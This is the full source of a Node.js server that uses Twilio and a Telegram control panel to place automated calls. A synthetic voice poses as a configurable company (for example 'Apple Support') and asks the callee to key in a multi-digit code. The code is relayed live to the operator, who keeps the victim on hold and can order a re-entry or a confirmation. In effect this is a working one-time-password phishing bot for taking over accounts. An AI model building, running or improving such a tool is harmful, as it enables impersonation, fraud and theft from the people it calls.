const express = require("express");
const fetch = require("node-fetch");
const twilio = require("twilio");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PORT = process.env.PORT || 3000;

// ===== ENV =====
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const TWILIO_ACCOUNT_SID =
  process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID;
const TWILIO_AUTH_TOKEN =
  process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN;
const TWILIO_NUMBER = process.env.TWILIO_NUMBER;

const BASE_URL = process.env.BASE_URL || "";
const ALLOWED_CHAT_IDS = (process.env.ALLOWED_CHAT_IDS || CHAT_ID || "")
  .split(",")
  .map(x => x.trim())
  .filter(Boolean);

const QUICK_DIAL_A_LABEL = process.env.QUICK_DIAL_A_LABEL || "Quick A";
const QUICK_DIAL_A_NUMBER = process.env.QUICK_DIAL_A_NUMBER || "";
const QUICK_DIAL_B_LABEL = process.env.QUICK_DIAL_B_LABEL || "Quick B";
const QUICK_DIAL_B_NUMBER = process.env.QUICK_DIAL_B_NUMBER || "";
const QUICK_DIAL_C_LABEL = process.env.QUICK_DIAL_C_LABEL || "Quick C";
const QUICK_DIAL_C_NUMBER = process.env.QUICK_DIAL_C_NUMBER || "";

const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);

// ===== DB =====
// Note: db.json persists on the current disk, but some hosts may reset it on redeploy.
const DB_FILE = path.join(__dirname, "db.json");

const defaultDB = {
  settings: {
    company: "Support",
    digits: 6,
    assistant: 0,
    itemName: "ticket number",
    greeting:
      "Hello from {company}. Please enter your {digits} digit {item}.",
    retryMessage: "Please re-enter your {item}.",
    reviewMessage: "Please wait while we review your {item}.",
    confirmMessage: "Thank you. Your {item} has been confirmed. Have a great day.",
    failMessage: "Sorry, we could not confirm your {item}. Please contact support later.",
    maxRetries: 3,
    inputTimeout: 8,
    holdSeconds: 10,
    paused: false,
    randomAssistant: false,
    readback: false
  },
  profiles: {},
  stats: {
    inboundCalls: 0,
    outboundCalls: 0,
    inputsReceived: 0,
    confirmed: 0,
    retries: 0,
    hungUp: 0,
    completedCalls: 0
  },
  logs: [],
  history: [],
  lastDialed: null
};

function loadDB() {
  try {
    if (!fs.existsSync(DB_FILE)) return structuredClone(defaultDB);
    const raw = fs.readFileSync(DB_FILE, "utf8");
    const parsed = JSON.parse(raw);
    return {
      ...structuredClone(defaultDB),
      ...parsed,
      settings: {
        ...structuredClone(defaultDB).settings,
        ...(parsed.settings || {})
      },
      stats: {
        ...structuredClone(defaultDB).stats,
        ...(parsed.stats || {})
      }
    };
  } catch {
    return structuredClone(defaultDB);
  }
}

let db = loadDB();

function saveDB() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
  } catch (e) {
    console.log("saveDB error:", e.message);
  }
}

// ===== SETTINGS / STATIC DATA =====
const assistants = [
  { name: "Nova", voice: "Polly.Joanna" },
  { name: "Lyra", voice: "Polly.Matthew" },
  { name: "Orion", voice: "Polly.Amy" },
  { name: "Astra", voice: "Polly.Brian" },
  { name: "Kairo", voice: "Polly.Justin" },
  { name: "Solara", voice: "Polly.Kendra" }
];

const quickDialTargets = {
  [QUICK_DIAL_A_LABEL]: QUICK_DIAL_A_NUMBER,
  [QUICK_DIAL_B_LABEL]: QUICK_DIAL_B_NUMBER,
  [QUICK_DIAL_C_LABEL]: QUICK_DIAL_C_NUMBER
};

// ===== RUNTIME STATE =====
const calls = new Map(); // sid -> call state
let panelMessageId = null;
let panelBrokenCount = 0;
let pendingInput = null; // call/company/item/digits/assistant/greeting
let scheduledJobs = [];
let lastCaller = null;

// ===== HELPERS =====
function settings() {
  return db.settings;
}

function stats() {
  return db.stats;
}

function logs() {
  return db.logs;
}

function history() {
  return db.history;
}

function assistant() {
  return assistants[settings().assistant] || assistants[0];
}

function assistantForCall(call) {
  if (!call) return assistant();
  return assistants[call.assistantIndex] || assistant();
}

function isAuthorized(update) {
  if (!ALLOWED_CHAT_IDS.length) return true;

  const chatId =
    update?.message?.chat?.id ||
    update?.callback_query?.message?.chat?.id ||
    update?.callback_query?.from?.id;

  return ALLOWED_CHAT_IDS.includes(String(chatId));
}

function template(str, call = null) {
  return String(str || "")
    .replaceAll("{company}", settings().company)
    .replaceAll("{digits}", String(settings().digits))
    .replaceAll("{item}", settings().itemName)
    .replaceAll("{caller}", call?.caller || "caller");
}

function pushLog(text) {
  db.logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
  db.logs = db.logs.slice(0, 40);
  saveDB();
}

function pushHistory(text) {
  db.history.unshift(`${new Date().toLocaleString()} ${text}`);
  db.history = db.history.slice(0, 150);
  saveDB();
}

function getOrCreateCall(callSid) {
  if (!callSid) return null;

  if (!calls.has(callSid)) {
    const ai = settings().randomAssistant
      ? Math.floor(Math.random() * assistants.length)
      : settings().assistant;

    calls.set(callSid, {
      sid: callSid,
      caller: null,
      input: null,
      status: "Idle",
      startedAt: Date.now(),
      assistantIndex: ai,
      retries: 0,
      endedAt: null
    });
  }

  return calls.get(callSid);
}

function cleanupEndedCalls() {
  const now = Date.now();
  for (const [sid, call] of calls.entries()) {
    if (call.status === "Ended" && call.endedAt && now - call.endedAt > 5 * 60 * 1000) {
      calls.delete(sid);
    }
  }
}

function callTimerText(call) {
  if (!call || !call.startedAt) return "00:00";
  const total = Math.floor((Date.now() - call.startedAt) / 1000);
  const mm = String(Math.floor(total / 60)).padStart(2, "0");
  const ss = String(total % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

function sortedCalls() {
  return Array.from(calls.values()).sort(
    (a, b) => (b.startedAt || 0) - (a.startedAt || 0)
  );
}

function newestActiveCall() {
  return sortedCalls().find(c => c.status !== "Ended" && c.status !== "Idle") || null;
}

function buildInputTwiml(call) {
  return `
<Response>
<Gather numDigits="${settings().digits}" action="${BASE_URL}/input" method="POST" timeout="${settings().inputTimeout}">
<Say voice="${assistantForCall(call).voice}">
${template(settings().greeting, call)}
</Say>
</Gather>
<Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`;
}

function buildRetryTwiml(call) {
  return `
<Response>
<Gather numDigits="${settings().digits}" action="${BASE_URL}/input" method="POST" timeout="${settings().inputTimeout}">
<Say voice="${assistantForCall(call).voice}">
${template(settings().retryMessage, call)}
</Say>
</Gather>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`;
}

function buildReviewTwiml(call) {
  const readback = settings().readback && call?.input
    ? `<Say voice="${assistantForCall(call).voice}">You entered ${String(call.input).split("").join(" ")}.</Say>`
    : "";

  return `
<Response>
${readback}
<Say voice="${assistantForCall(call).voice}">
${template(settings().reviewMessage, call)}
</Say>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`;
}

function buildConfirmTwiml(call) {
  return `
<Response>
<Say voice="${assistantForCall(call).voice}">
${template(settings().confirmMessage, call)}
</Say>
<Hangup/>
</Response>
`;
}

function buildFailTwiml(call) {
  return `
<Response>
<Say voice="${assistantForCall(call).voice}">
${template(settings().failMessage, call)}
</Say>
<Hangup/>
</Response>
`;
}

// ===== TELEGRAM =====
async function tg(method, data) {
  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
  return res.json();
}

async function tgSend(text, buttons = null) {
  const body = { chat_id: CHAT_ID, text };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  return tg("sendMessage", body);
}

async function tgEdit(messageId, text, buttons = null) {
  const body = { chat_id: CHAT_ID, message_id: messageId, text };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  return tg("editMessageText", body);
}

async function tgAnswerCallback(callbackQueryId, text = "") {
  try {
    await tg("answerCallbackQuery", {
      callback_query_id: callbackQueryId,
      text
    });
  } catch {}
}

// ===== PANEL =====
function panelButtons() {
  const quickButtons = Object.entries(quickDialTargets)
    .filter(([, num]) => num)
    .slice(0, 3)
    .map(([label]) => ({ text: `📲 ${label}`, callback_data: `qd:${label}` }));

  const profileButtons = Object.keys(db.profiles)
    .slice(0, 4)
    .map(name => ({ text: `📁 ${name}`, callback_data: `profile:${name}` }));

  const rows = [
    [
      { text: "✔ Confirm", callback_data: "confirm" },
      { text: "🔁 Retry", callback_data: "retry" }
    ],
    [{ text: "⛔ Hang Up", callback_data: "hangup" }],
    [
      { text: "📞 Call Last", callback_data: "calllast" },
      { text: "📲 Call", callback_data: "call" }
    ]
  ];

  if (quickButtons.length) rows.push(quickButtons);
  if (profileButtons.length) rows.push(profileButtons);

  rows.push([{ text: settings().paused ? "▶ Resume" : "⏸ Pause", callback_data: settings().paused ? "resume" : "pause" }]);
  rows.push([{ text: "⚡ Wake Server", callback_data: "wake" }]);
  rows.push([
    { text: "📊 Status", callback_data: "status" },
    { text: "📜 Logs", callback_data: "logs" }
  ]);

  return rows;
}

function panelText() {
  cleanupEndedCalls();

  const active = sortedCalls().slice(0, 8);
  const lines = ["📞 LIVE CALLS", ""];

  if (!active.length) {
    lines.push("No active calls");
    lines.push("");
  } else {
    active.forEach((call, index) => {
      lines.push(`${index + 1}) ${call.status}`);
      lines.push(`Caller: ${call.caller || "Unknown"}`);
      lines.push(`${settings().itemName}: ${call.input || "waiting"}`);
      lines.push(`Retries: ${call.retries}/${settings().maxRetries}`);
      lines.push(`Assistant: ${assistantForCall(call).name}`);
      lines.push(`Time: ${callTimerText(call)}`);
      lines.push("");
    });
  }

  lines.push(`Company: ${settings().company}`);
  lines.push(`Digits: ${settings().digits}`);
  lines.push(`Assistant: ${assistant().name}`);
  lines.push(`Item: ${settings().itemName}`);
  lines.push(`Paused: ${settings().paused ? "Yes" : "No"}`);
  lines.push(`Max Retries: ${settings().maxRetries}`);
  lines.push(`Input Timeout: ${settings().inputTimeout}s`);

  return lines.join("\n");
}

async function updatePanel(forceNew = false) {
  try {
    const text = panelText();
    const buttons = panelButtons();

    if (!panelMessageId || forceNew) {
      const msg = await tgSend(text, buttons);
      if (msg && msg.result && msg.result.message_id) {
        panelMessageId = msg.result.message_id;
      }
      return;
    }

    const result = await tgEdit(panelMessageId, text, buttons);

    if (result && result.ok === false) {
      panelBrokenCount++;
      if (panelBrokenCount >= 2) {
        panelMessageId = null;
        await updatePanel(true);
      }
    } else {
      panelBrokenCount = 0;
    }
  } catch {
    panelBrokenCount++;
    if (panelBrokenCount >= 2) panelMessageId = null;
  }
}

// ===== CALL CONTROL =====
async function startCall(number) {
  if (!number) return;

  if (settings().paused) {
    await tgSend("⏸ Outbound calling is paused");
    return;
  }

  db.lastDialed = number;
  stats().outboundCalls++;
  saveDB();

  await client.calls.create({
    url: `${BASE_URL}/ivr`,
    to: number,
    from: TWILIO_NUMBER,
    statusCallback: `${BASE_URL}/call-status`,
    statusCallbackEvent: ["initiated", "ringing", "answered", "completed"],
    statusCallbackMethod: "POST"
  });

  pushLog(`Outbound call started to ${number}`);
  pushHistory(`Outbound call to ${number}`);
}

async function updateLiveCallTwiml(callSid, twiml) {
  if (!callSid) return;
  await client.calls(callSid).update({ twiml });
}

async function endLiveCallImmediately(callSid) {
  if (!callSid) return;
  await client.calls(callSid).update({
    twiml: `<Response><Hangup/></Response>`
  });
}

function scheduleOutboundCall(number, delayMs) {
  const id = Date.now() + Math.random();
  const timeout = setTimeout(async () => {
    try {
      await startCall(number);
      stats().scheduledCalls = (stats().scheduledCalls || 0) + 1;
      saveDB();
      pushLog(`Scheduled call fired to ${number}`);
      pushHistory(`Scheduled call fired to ${number}`);
    } catch (e) {
      pushLog(`Scheduled call failed to ${number}: ${e.message}`);
    } finally {
      scheduledJobs = scheduledJobs.filter(x => x.id !== id);
    }
  }, delayMs);

  scheduledJobs.push({ id, number, timeout, fireAt: Date.now() + delayMs });
}

function parseDelay(text) {
  const value = text.trim().toLowerCase();

  const sec = value.match(/^(\d+)s$/);
  if (sec) return parseInt(sec[1], 10) * 1000;

  const min = value.match(/^(\d+)m$/);
  if (min) return parseInt(min[1], 10) * 60 * 1000;

  const hr = value.match(/^(\d+)h$/);
  if (hr) return parseInt(hr[1], 10) * 60 * 60 * 1000;

  return null;
}

function loadProfile(name) {
  const p = db.profiles[name];
  if (!p) return false;

  db.settings.assistant = p.assistant;
  db.settings.digits = p.digits;
  db.settings.itemName = p.itemName;
  db.settings.company = p.company;
  saveDB();
  return true;
}

// ===== ROOT =====
app.get("/", (req, res) => {
  res.send("Server running");
});

app.get("/ping", (req, res) => {
  res.send("pong");
});

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    time: Date.now(),
    activeCalls: sortedCalls().filter(c => c.status !== "Ended").length,
    paused: settings().paused,
    lastDialed: db.lastDialed
  });
});

app.get("/ivr", (req, res) => {
  res.type("text/xml");
  res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
});

// ===== TWILIO STATUS =====
app.post("/call-status", async (req, res) => {
  try {
    const status = req.body.CallStatus;
    const from = req.body.From;
    const sid = req.body.CallSid;

    const call = getOrCreateCall(sid);
    if (call) {
      if (from) call.caller = from;

      if (status === "ringing") {
        call.status = "Ringing";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "in-progress" || status === "answered") {
        call.status = "Answered";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "completed") {
        call.status = "Ended";
        call.endedAt = Date.now();
        stats().completedCalls++;
        saveDB();
      }

      updatePanel();
    }
  } catch (e) {
    console.log("call-status error:", e.message);
  }

  res.sendStatus(200);
});

// ===== IVR START =====
app.post("/ivr", async (req, res) => {
  try {
    const sid = req.body.CallSid;
    const from = req.body.From;

    const call = getOrCreateCall(sid);
    if (call) {
      call.caller = from || call.caller;
      call.status = settings().paused ? "Paused" : "Answered";
      call.startedAt = call.startedAt || Date.now();
      call.assistantIndex = settings().randomAssistant
        ? Math.floor(Math.random() * assistants.length)
        : settings().assistant;
    }

    lastCaller = from || lastCaller;
    stats().inboundCalls++;
    saveDB();

    await updatePanel();

    res.type("text/xml");

    if (settings().paused) {
      return res.send(`
<Response>
<Say voice="${assistantForCall(call).voice}">
Calling is currently paused. Please try again later.
</Say>
<Hangup/>
</Response>
`);
    }

    res.send(buildInputTwiml(call));
  } catch (e) {
    console.log("/ivr error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ===== INPUT RECEIVED =====
app.post("/input", async (req, res) => {
  try {
    const digits = req.body.Digits;
    const caller = req.body.From;
    const sid = req.body.CallSid;

    const call = getOrCreateCall(sid);
    if (call) {
      call.caller = caller;
      call.input = digits;
      call.status = "Answered";
      call.startedAt = Date.now();
    }

    lastCaller = caller;
    stats().inputsReceived++;
    saveDB();

    pushLog(`${caller} : ${digits}`);
    pushHistory(`${caller} -> ${settings().itemName}: ${digits}`);

    res.type("text/xml");
    res.send(buildReviewTwiml(call));

    try {
      await tgSend(`📞 INPUT RECEIVED

Caller: ${caller}
${settings().itemName}: ${digits}`);
      await updatePanel();
    } catch (e) {
      console.log("post-input telegram error:", e.message);
    }
  } catch (e) {
    console.log("/input error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ===== HOLD LOOP =====
app.post("/hold", (req, res) => {
  res.type("text/xml");
  res.send(`
<Response>
<Pause length="${settings().holdSeconds}"/>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);
});

// ===== TELEGRAM WEBHOOK =====
app.post("/telegram", async (req, res) => {
  try {
    const update = req.body || {};

    if (!isAuthorized(update)) {
      return res.sendStatus(200);
    }

    if (update.callback_query) {
      const action = update.callback_query.data;
      const callbackId = update.callback_query.id;
      const call = newestActiveCall();
      const callSid = call ? call.sid : null;

      if (action === "confirm") {
        if (callSid) {
          await updateLiveCallTwiml(callSid, buildConfirmTwiml(call));
          call.status = "Ended";
          call.endedAt = Date.now();
          stats().confirmed++;
          stats().completedCalls++;
          saveDB();
          pushLog("Confirmed");
          pushHistory(`Confirmed ${call.caller || call.sid}`);
          await updatePanel();
        }
        await tgAnswerCallback(callbackId, "Confirmed");
        return res.sendStatus(200);
      }

      if (action === "retry") {
        if (callSid) {
          call.retries++;

          if (call.retries >= settings().maxRetries) {
            await updateLiveCallTwiml(callSid, buildFailTwiml(call));
            call.status = "Ended";
            call.endedAt = Date.now();
            stats().completedCalls++;
            saveDB();
            pushLog("Max retries reached");
            pushHistory(`Max retries reached for ${call.caller || call.sid}`);
          } else {
            await updateLiveCallTwiml(callSid, buildRetryTwiml(call));
            call.input = null;
            stats().retries++;
            saveDB();
            pushLog("Retry requested");
          }
        }

        await updatePanel();
        await tgAnswerCallback(callbackId, "Retry sent");
        return res.sendStatus(200);
      }

      if (action === "hangup") {
        if (callSid) {
          await endLiveCallImmediately(callSid);
          call.status = "Ended";
          call.endedAt = Date.now();
          stats().hungUp++;
          stats().completedCalls++;
          saveDB();
          pushLog("Hung up");
          pushHistory(`Hung up ${call.caller || call.sid}`);
          await updatePanel();
        }
        await tgAnswerCallback(callbackId, "Hung up");
        return res.sendStatus(200);
      }

      if (action === "calllast") {
        if (db.lastDialed) {
          await startCall(db.lastDialed);
          await tgSend(`📞 Calling last dialed number ${db.lastDialed}`);
        } else {
          await tgSend("No previous outbound call");
        }
        await tgAnswerCallback(callbackId, "Calling");
        return res.sendStatus(200);
      }

      if (action === "call") {
        pendingInput = "call";
        await tgSend("Send the number to call.\nExample:\n/call +447123456789");
        await tgAnswerCallback(callbackId, "Waiting for number");
        return res.sendStatus(200);
      }

      if (action === "pause") {
        db.settings.paused = true;
        saveDB();
        await updatePanel();
        await tgAnswerCallback(callbackId, "Paused");
        return res.sendStatus(200);
      }

      if (action === "resume") {
        db.settings.paused = false;
        saveDB();
        await updatePanel();
        await tgAnswerCallback(callbackId, "Resumed");
        return res.sendStatus(200);
      }

      if (action === "wake") {
        await fetch(BASE_URL);
        await fetch(BASE_URL + "/ping");
        await fetch(BASE_URL + "/health");
        await tgSend("⚡ Server wake request sent");
        await tgAnswerCallback(callbackId, "Server waking");
        return res.sendStatus(200);
      }

      if (action === "status") {
        await updatePanel();
        await tgAnswerCallback(callbackId, "Panel refreshed");
        return res.sendStatus(200);
      }

      if (action === "logs") {
        let text = "📜 Logs\n\n";
        logs().forEach(l => {
          text += l + "\n";
        });
        await tgSend(text);
        await tgAnswerCallback(callbackId, "Logs sent");
        return res.sendStatus(200);
      }

      if (action.startsWith("qd:")) {
        const label = action.split(":")[1];
        const number = quickDialTargets[label];
        if (number) {
          await startCall(number);
          await tgSend(`📲 Calling ${label}: ${number}`);
        } else {
          await tgSend("Quick dial not set");
        }
        await tgAnswerCallback(callbackId, "Calling");
        return res.sendStatus(200);
      }

      if (action.startsWith("profile:")) {
        const name = action.split(":")[1];
        if (loadProfile(name)) {
          await tgSend(`📁 Profile loaded: ${name}`);
          await updatePanel();
        } else {
          await tgSend("Profile not found");
        }
        await tgAnswerCallback(callbackId, "Profile loaded");
        return res.sendStatus(200);
      }
    }

    if (update.message && update.message.text) {
      const text = update.message.text.trim();

      if (pendingInput === "call" && !text.startsWith("/")) {
        pendingInput = null;
        await startCall(text);
        await tgSend(`📞 Calling ${text}`);
        return res.sendStatus(200);
      }

      if (text === "/panel" || text === "/menu" || text === "/status") {
        panelMessageId = null;
        await updatePanel(true);
        return res.sendStatus(200);
      }

      if (text === "/help" || text === "/commands") {
        await tgSend(`🤖 Commands

/panel
/menu
/status
/logs
/history
/stats
/call +number
/calllast
/digits X
/assistant X
/company NAME
/item NAME
/saveprofile NAME
/profile NAME
/profiles
/deleteprofile NAME
/pause
/resume
/stop
/quickdials
/settings`);
        return res.sendStatus(200);
      }

      if (text === "/settings") {
        await tgSend(`⚙ Current Settings

Company: ${settings().company}
Digits: ${settings().digits}
Assistant: ${assistant().name}
Item: ${settings().itemName}
Max Retries: ${settings().maxRetries}
Paused: ${settings().paused ? "Yes" : "No"}`);
        return res.sendStatus(200);
      }

      if (text === "/logs") {
        let textOut = "📜 Logs\n\n";
        logs().forEach(l => (textOut += l + "\n"));
        await tgSend(textOut);
        return res.sendStatus(200);
      }

      if (text === "/history") {
        let textOut = "🗂 History\n\n";
        history().slice(0, 30).forEach(l => (textOut += l + "\n"));
        await tgSend(textOut);
        return res.sendStatus(200);
      }

      if (text === "/stats") {
        await tgSend(`📈 Stats

Inbound: ${stats().inboundCalls}
Outbound: ${stats().outboundCalls}
Inputs: ${stats().inputsReceived}
Confirmed: ${stats().confirmed}
Retries: ${stats().retries}
Hung Up: ${stats().hungUp}
Completed: ${stats().completedCalls}`);
        return res.sendStatus(200);
      }

      if (text.startsWith("/call ")) {
        const number = text.split(" ")[1];
        if (!number) {
          await tgSend("Usage: /call +447xxxxxxxx");
        } else {
          await startCall(number);
          await tgSend(`📞 Calling ${number}`);
        }
        return res.sendStatus(200);
      }

      if (text === "/calllast") {
        if (!db.lastDialed) {
          await tgSend("No previous outbound call");
        } else {
          await startCall(db.lastDialed);
          await tgSend(`📞 Calling ${db.lastDialed}`);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/digits")) {
        const d = parseInt(text.split(" ")[1], 10);
        if (d >= 2 && d <= 10) {
          db.settings.digits = d;
          saveDB();
          await tgSend(`✅ ${d} digits set`);
          await updatePanel();
        } else {
          await tgSend("Use /digits 2 to 10");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/assistant")) {
        const a = parseInt(text.split(" ")[1], 10);
        if (a >= 1 && a <= assistants.length) {
          db.settings.assistant = a - 1;
          saveDB();
          await tgSend(`🎙 ${assistant().name} assistant set`);
          await updatePanel();
        } else {
          await tgSend("Use /assistant 1 to 6");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/company")) {
        const name = text.replace("/company", "").trim();
        if (!name) {
          await tgSend("Usage: /company Apple Support");
        } else {
          db.settings.company = name;
          saveDB();
          await tgSend(`🏢 Company set to ${db.settings.company}`);
          await updatePanel();
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/item")) {
        const name = text.replace("/item", "").trim();
        if (!name) {
          await tgSend("Usage: /item ticket number");
        } else {
          db.settings.itemName = name;
          saveDB();
          await tgSend(`📝 Item set to ${db.settings.itemName}`);
          await updatePanel();
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/saveprofile")) {
        const name = text.split(" ")[1];
        if (!name) {
          await tgSend("Usage: /saveprofile name");
        } else {
          db.profiles[name] = {
            assistant: settings().assistant,
            digits: settings().digits,
            itemName: settings().itemName,
            company: settings().company
          };
          saveDB();
          await tgSend(`✅ Profile saved: ${name}`);
          await updatePanel();
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/profile ")) {
        const name = text.split(" ")[1];
        if (loadProfile(name)) {
          await tgSend(`📁 Profile loaded: ${name}`);
          await updatePanel();
        } else {
          await tgSend("Profile not found");
        }
        return res.sendStatus(200);
      }

      if (text === "/profiles") {
        const names = Object.keys(db.profiles);
        await tgSend(
          names.length ? `📁 Profiles\n\n${names.join("\n")}` : "No saved profiles"
        );
        return res.sendStatus(200);
      }

      if (text.startsWith("/deleteprofile")) {
        const name = text.split(" ")[1];
        if (!name || !db.profiles[name]) {
          await tgSend("Profile not found");
        } else {
          delete db.profiles[name];
          saveDB();
          await tgSend(`🗑 Deleted profile: ${name}`);
          await updatePanel();
        }
        return res.sendStatus(200);
      }

      if (text === "/pause") {
        db.settings.paused = true;
        saveDB();
        await tgSend("⏸ Calling paused");
        await updatePanel();
        return res.sendStatus(200);
      }

      if (text === "/resume") {
        db.settings.paused = false;
        saveDB();
        await tgSend("▶ Calling resumed");
        await updatePanel();
        return res.sendStatus(200);
      }

      if (text === "/stop") {
        const active = sortedCalls().filter(c => c.status !== "Ended");
        for (const c of active) {
          try {
            await endLiveCallImmediately(c.sid);
            c.status = "Ended";
            c.endedAt = Date.now();
          } catch {}
        }
        db.settings.paused = true;
        saveDB();
        await tgSend("🛑 All calls stopped and calling paused");
        await updatePanel();
        return res.sendStatus(200);
      }

      if (text === "/quickdials") {
        let out = "📇 Quick Dials\n\n";
        Object.entries(quickDialTargets).forEach(([label, number]) => {
          out += `${label}: ${number || "not set"}\n`;
        });
        await tgSend(out);
        return res.sendStatus(200);
      }
    }
  } catch (e) {
    console.log("/telegram error:", e.message);
  }

  res.sendStatus(200);
});

// ===== LIVE PANEL =====
setInterval(() => {
  if (panelMessageId) updatePanel();
  cleanupEndedCalls();
}, 1000);

app.listen(PORT, () => {
  console.log("Server started");
  console.log("Server booted and ready for calls");
});
